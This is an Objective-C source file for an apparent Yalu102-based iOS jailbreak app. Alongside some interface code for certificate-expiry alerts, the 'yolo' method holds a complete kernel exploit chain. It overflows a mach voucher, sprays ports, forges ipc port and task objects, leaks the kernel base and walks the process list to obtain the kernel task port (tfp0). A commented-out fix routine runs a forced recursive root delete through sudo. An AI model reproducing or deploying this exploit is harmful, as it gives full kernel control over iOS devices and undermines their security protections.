//
    //  ViewController.m
    //  yalu102
    //
    //  Created by qwertyoruiop on 05/01/2017. This version by GeoSn0w, parts of the code owned by GeoSn0w should not be made the responsibility of qwertyoruiop
    //  Copyright © 2017 kimjongcracks. All rights reserved. (Yeee)
    //
    
#import "offsets.h"
#import "ViewController.h"
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#import "devicesupport.h"
#import <sys/mount.h>
#import <spawn.h>
#import <copyfile.h>
#import <mach-o/dyld.h>
#import <sys/types.h>
#import <sys/stat.h>
#import <sys/utsname.h>
#include <sys/utsname.h>
    
    extern uint64_t procoff;
    
    typedef struct {
        mach_msg_header_t head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t desc[256];
        char pad[4096];
    } sprz;
    
    @interface ViewController ()

    @end

    @implementation ViewController
    //Starting Geosn0w's code... (Code is segmented on GeoSn0w / Todesco so that you know who to ask for support for each part of the code.)
    /*
    *******************************************************************************************************************************************
    */
    - (UIStatusBarStyle)preferredStatusBarStyle {
    
        return UIStatusBarStyleLightContent; //Pitch black ain't my favorite.
    }
    - (void)viewDidLoad {
        [super viewDidLoad];
        if([[NSUserDefaults standardUserDefaults] objectForKey:@"IDate"])
        {
            NSDate *watchCAT = [[NSUserDefaults standardUserDefaults] objectForKey:@"IDate"];
            NSTimeInterval time = [[NSDate date] timeIntervalSinceDate:watchCAT]; //CatFish
            int hellnopleasenonocertificationpleasee = time/86400;
            self.certiftime.text = [NSString stringWithFormat:@"%d Days Since Installation",hellnopleasenonocertificationpleasee+1]; //Hell no
            if ([_certiftime.text isEqualToString:@"1 Days Since Installation"]){
                self.certiftime.text = @"1 Day Since Installation";
            }
            else{
            self.certiftime.text = [NSString stringWithFormat:@"%d Days Since Installation",hellnopleasenonocertificationpleasee+1]; //Hell yeah
            }
            
        }
        else
        {
            [[NSUserDefaults standardUserDefaults] setObject:[NSDate date] forKey:@"IDate"];
            [[NSUserDefaults standardUserDefaults] synchronize];
            
        }
        
        NSArray* alphaArray = [NSArray arrayWithObjects: @"6 Days Since Installation", @"12 Days Since InstallationB", @"18 Days Since Installation", @"24 Days Since Installation", @"30 Days Since Installation", @"36 Days Since Installation", @"42 Days Since Installation", @"48 Days Since Installation", @"54 Days Since Installation", @"60 Days Since Installation", @"66 Days Since Installation", @"72 Days Since Installation", @"78 Days Since Installation", @"84 Days Since Installation", @"90 Days Since Installation", @"96 Days Since Installation", @"102 Days Since Installation", @"108 Days Since Installation", @"114 Days Since Installation", @"120 Days Since Installation", @"126 Days Since Installation", @"132 Days Since Installation", @"138 Days Since Installation", @"144 Days Since Installation", @"150 Days Since Installation", @"156 Days Since Installation", @"162 Days Since Installation", @"168 Days Since Installation", @"174 Days Since Installation", @"180 Days Since Installation",nil];
        BOOL found = NO;
        for ( NSString* stringFromArray in alphaArray ) {
            if ([self.certiftime.text isEqualToString:stringFromArray]) {
                found = YES;
                break;
            }
        }
        if ( found ) {
            UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"I don't like to be the one who breaks the bad news but..."
                                                            message:@"Your Yalu's certificate will expire in less than 24 hours, which means you won't be able to open the app anymore and Jailbreak if you reboot. I recommend using Cydia Impactor to resign Yalu Dark. If you have no idea how to do that, contact me on Twitter: @FCE365"
                                                           delegate:self
                                                  cancelButtonTitle:@"Umm, okay."
                                                  otherButtonTitles:nil];
            [alert show];
            
        }
       
        NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
        self.iOSVer.text = currSysVer;
        //Leaving Geosn0w's code...
        /*
         *******************************************************************************************************************************************
        */
        init_offsets();
        struct utsname u = { 0 };
        uname(&u);
        if (strstr(u.version, "MarijuanARM")) {
            [dope setEnabled:NO];
            [dope setTitle:@"Jailbroken" forState:UIControlStateDisabled];
        }
    }
    
    typedef natural_t not_natural_t;
    
    struct not_essers_ipc_object {
        not_natural_t io_bits;
        not_natural_t io_references;
        char    io_lock_data[1337];
    };
    

#define IO_BITS_ACTIVE 0x80000000
#define	IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25
    
    char dt[128];
/*
    - (IBAction)fixcydia:(UIButton*)sender
    {
        if(isJailbroken() == YES){
        NSString* thefile = @"/.installed_yaluX";
        BOOL fileExists = [[NSFileManager defaultManager] fileExistsAtPath:thefile];
        if(fileExists == YES){
        [[NSFileManager defaultManager] setAttributes:@{ NSFilePosixPermissions : @0775 }
                                         ofItemAtPath:@"/.installed_yaluX"
                                                error:nil];
            system("echo alpine | sudo -S rm -rf /.installed_yaluX");
            
            if(fileExists == YES){
                
                    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Error Applying The Fix"
                                                                    message:@"Cannot apply the fix. Something went wrong. Please contact @FCE365 for support."
                                                                   delegate:self
                                                          cancelButtonTitle:@"Umm, okay."
                                                          otherButtonTitles:nil];
                    [alert show];

            }
            else if (fileExists == NO){
                UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@""
                                                                message:@"Fix successfully applied! Rebooting the device, please re-jailbreak after the reboot. ~GeoSn0w"
                                                               delegate:self
                                                      cancelButtonTitle:nil
                                                      otherButtonTitles:nil];
                [alert show];
                
                rebootqueue(1.0, ^
                {
                    system("reboot");
                });            }
        }
        else if (fileExists == NO){
            UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Error Applying The Fix"
                                                            message:@"Cannot apply the fix. Something went wrong. Please contact @FCE365 for support. File not found."
                                                           delegate:self
                                                  cancelButtonTitle:@"Umm, okay."
                                                  otherButtonTitles:nil];
            [alert show];

        }
        }
        else if(isJailbroken() == NO){
            UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Hold on!"
                                                            message:@"Before using this fix, try to Jailbreak!"
                                                           delegate:self
                                                  cancelButtonTitle:@"Umm, okay."
                                                  otherButtonTitles:nil];
            [alert show];

        }

    }
 */
    typedef void (^WaitCompletionBlock)();
    void rebootqueue(NSTimeInterval duration, WaitCompletionBlock completion)
    {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, duration * NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^
                   { completion(); });
    }
    - (IBAction)yolo:(UIButton*)sender
    {
        mach_port_t vch = 0;
        
        mach_voucher_attr_recipe_data_t *data = malloc(sizeof(mach_voucher_attr_recipe_data_t) + 0x10);
        data->content_size = 0;
        data->key=MACH_VOUCHER_ATTR_KEY_BANK;
        data->command=610;
        data->previous_voucher=MACH_PORT_NULL;
        
        kern_return_t lol = host_create_mach_voucher(mach_host_self(), data, sizeof(mach_voucher_attr_recipe_data_t), &vch);
        
        assert(lol==0 && vch!=0);
        
        
        unsigned char* odata = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
        unsigned char* fdata = mmap(odata+0x4000, 0x4000, PROT_NONE, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
        assert(fdata == odata + 0x4000);
        memset(odata, 0x42, 0x0);
        
        
        uint64_t rsz = 0x100; // alloc size;
        fdata -= rsz + 0x100; // overflow full chunk
        
        struct not_essers_ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
        
        mlock(fakeport, 0x8000);
        
        fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
        fakeport->io_lock_data[12] = 0x11;
        
        *(uint64_t*) (fdata + rsz) = (uint64_t) fakeport;
        
        
        mach_port_t* ports = calloc(800, sizeof(mach_port_t));
        
        for (int i = 0; i < 800; i++) {
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
            mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
        }
        sprz msg1;
        
        memset(&msg1, 0, sizeof(sprz));
        sprz msg2;
        
        memset(&msg2, 0, sizeof(sprz));
        msg1.msgh_body.msgh_descriptor_count = 128;
        
        msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        msg1.head.msgh_local_port = MACH_PORT_NULL;
        msg1.head.msgh_size = sizeof(msg1)-2048;
        
        mach_port_t* buffer = calloc(0x1000, sizeof(mach_port_t));
        for (int i = 0; i < 0x1000; i++) {
            buffer[i] = MACH_PORT_DEAD;
        }
        
        for (int i = 0; i < 256; i++) {
            msg1.desc[i].address = buffer;
            msg1.desc[i].count = 0x100/8;
            msg1.desc[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
            msg1.desc[i].disposition = 19;
        }
        
        pthread_yield_np();
        for (int i=1; i<300; i++) {
            msg1.head.msgh_remote_port = ports[i];
            kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
            assert(kret==0);
        }
        
        pthread_yield_np();
        for (int i=500; i<800; i++) {
            msg1.head.msgh_remote_port = ports[i];
            kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
            assert(kret==0);
        }
        
        pthread_yield_np();
        for (int i=300; i<500; i++) {
            msg1.head.msgh_remote_port = ports[i];
            if (i%4 == 0) {
                msg1.msgh_body.msgh_descriptor_count = 1;
            } else {
                msg1.msgh_body.msgh_descriptor_count = 256;
            }
            kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
            assert(kret==0);
        }
        
        pthread_yield_np();
        for (int i = 300; i<500; i+=4) {
            msg2.head.msgh_local_port = ports[i];
            kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
            if(!(i < 380))
                ports[i] = 0;
            assert(kret==0);
        }
        for (int i = 300; i<380; i+=4) {
            msg1.head.msgh_remote_port = ports[i];
            msg1.msgh_body.msgh_descriptor_count = 1;
            kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
            assert(kret==0);
        }
        
        mach_voucher_extract_attr_recipe_trap(vch, MACH_VOUCHER_ATTR_KEY_BANK, fdata, &rsz);
        mach_port_t foundport = 0;
        for (int i=1; i<500; i++) {
            if (ports[i]) {
                msg1.head.msgh_local_port = ports[i];
                pthread_yield_np();
                kern_return_t kret = mach_msg(&msg1, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
                assert(kret==0);
                for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
                    mach_port_t* ptz = msg1.desc[k].address;
                    for (int z = 0; z < 0x100/8; z++) {
                        if (ptz[z] != MACH_PORT_DEAD) {
                            if (ptz[z]) {
                                foundport = ptz[z];
                                goto foundp;
                            }
                            
                        }
                    }
                }
                mach_msg_destroy(&msg1.head);
                mach_port_deallocate(mach_task_self(), ports[i]);
                ports[i] = 0;
            }
        }
        [sender setTitle:@"Failed :(" forState:UIControlStateNormal]; //God why?!
        return;
        
    foundp:
        NSLog(@"found corruption %x", foundport);
        
        uint64_t textbase = 0xfffffff007004000;
        
        for (int i = 0; i < 0x300; i++) {
            for (int k = 0; k < 0x40000; k+=8) {
                *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
                *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
                
                kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
                
                if (kret != KERN_FAILURE) {
                    goto gotclock;
                }
            }
        }
        [sender setTitle:@"Failed :(" forState:UIControlStateNormal];
        return;
        
    gotclock:;
        uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
        
        leaked_ptr &= ~0x3FFF;
        
        fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
        fakeport->io_references = 0xff;
        char* faketask = ((char*)fakeport) + 0x1000;
        
        *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
        *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
        *(uint64_t*) (faketask + 0x10) = 0xee;
        
        while (1) {
            int32_t leaked = 0;
            *(uint64_t*) (faketask + procoff) = leaked_ptr - 0x10;
            pid_for_task(foundport, &leaked);
            if (leaked == MH_MAGIC_64) {
                NSLog(@"found kernel text at %llx", leaked_ptr);
                break;
            }
            leaked_ptr -= 0x4000;
        }
        
        uint64_t kernel_base = leaked_ptr;
        
        uint64_t allproc = allproc_offset + kernel_base;
        
        uint64_t proc_ = allproc;
        
        uint64_t myproc = 0;
        uint64_t kernproc = 0;
        
        while (proc_) {
            uint64_t proc = 0;
            
            *(uint64_t*) (faketask + procoff) = proc_ - 0x10;
            pid_for_task(foundport, (int32_t*)&proc);
            *(uint64_t*) (faketask + procoff) = 4 + proc_ - 0x10;
            pid_for_task(foundport, (int32_t*)(((uint64_t)(&proc)) + 4));
            
            int pd = 0;
            *(uint64_t*) (faketask + procoff) = proc;
            pid_for_task(foundport, &pd);
            
            if (pd == getpid()) {
                myproc = proc;
            } else if (pd == 0){
                kernproc = proc;
            }
            proc_ = proc;
        }
        
        
        uint64_t kern_task = 0;
        *(uint64_t*) (faketask + procoff) = kernproc - 0x10 + 0x18;
        pid_for_task(foundport, (int32_t*)&kern_task);
        *(uint64_t*) (faketask + procoff) = 4 + kernproc - 0x10 + 0x18;
        pid_for_task(foundport, (int32_t*)(((uint64_t)(&kern_task)) + 4));
        
        uint64_t itk_kern_sself = 0;
        *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + 0xe8;
        pid_for_task(foundport, (int32_t*)&itk_kern_sself);
        *(uint64_t*) (faketask + procoff) = 4 + kern_task - 0x10 + 0xe8;
        pid_for_task(foundport, (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));
        
        char* faketaskport = malloc(0x1000);
        char* ktaskdump = malloc(0x1000);
        
        for (int i = 0; i < 0x1000/4; i++) {
            *(uint64_t*) (faketask + procoff) = itk_kern_sself - 0x10 + i*4;
            pid_for_task(foundport, (int32_t*)(&faketaskport[i*4]));
        }
        for (int i = 0; i < 0x1000/4; i++) {
            *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + i*4;
            pid_for_task(foundport, (int32_t*)(&ktaskdump[i*4]));
        }
        
        memcpy(fakeport, faketaskport, 0x1000);
        memcpy(faketask, ktaskdump, 0x1000);
        
        mach_port_t pt = 0;
        
        *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
        *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
        
        *(uint64_t*)(((uint64_t)faketask) + 0x2b8) = itk_kern_sself;
        
        task_get_special_port(foundport, 4, &pt); // get tfp0, you say?
        NSLog(@"got tfp0 -> %x", pt);
        fakeport->io_bits = 0;
        
        extern uint64_t slide;
        slide = kernel_base - 0xFFFFFFF007004000;
        
        void exploit(void*, mach_port_t, uint64_t, uint64_t);
        exploit(sender, pt, kernel_base, allproc_offset);
        [dope setEnabled:NO];
        [dope setTitle:@"Already Jailbroken" forState:UIControlStateDisabled];
        
    }
    
    - (void)didReceiveMemoryWarning {
        [super didReceiveMemoryWarning];
        // Dispose of any resources that can be recreated. Or something...
    }
    
- (IBAction)unwindToThisViewController:(UIStoryboardSegue *)unwindSegue
{
}
BOOL isJailbroken()
{
    //We're detecting if the device is Jailbroken, eitherway, the app fails.
    
    FILE *f = NULL ;
    if ((f = fopen("/bin/bash", "r")) ||
        (f = fopen("/Applications/Cydia.app", "r")) ||
        (f = fopen("/Library/MobileSubstrate/MobileSubstrate.dylib", "r")) ||
        (f = fopen("/usr/sbin/sshd", "r")) ||
        (f = fopen("/etc/apt", "r")))  {
        fclose(f);
        return YES;
    }
    fclose(f);
    
    NSError *error;
    NSString *blimey = @"GeoSn0w will hear about your reverse engineering attempts ;)";
    [blimey writeToFile:@"/private/smallensk.txt" atomically:YES encoding:NSUTF8StringEncoding error:&error];
    [[NSFileManager defaultManager] removeItemAtPath:@"/private/smallensk.txt" error:nil];
    if(error == nil)
    {
        return YES;
    }
    
    return NO;
}

- (void)dealloc {
    
    [_fixespop release];
    [_fixcydia release];
    [_certiftime release];
    [super dealloc];
}
    @end
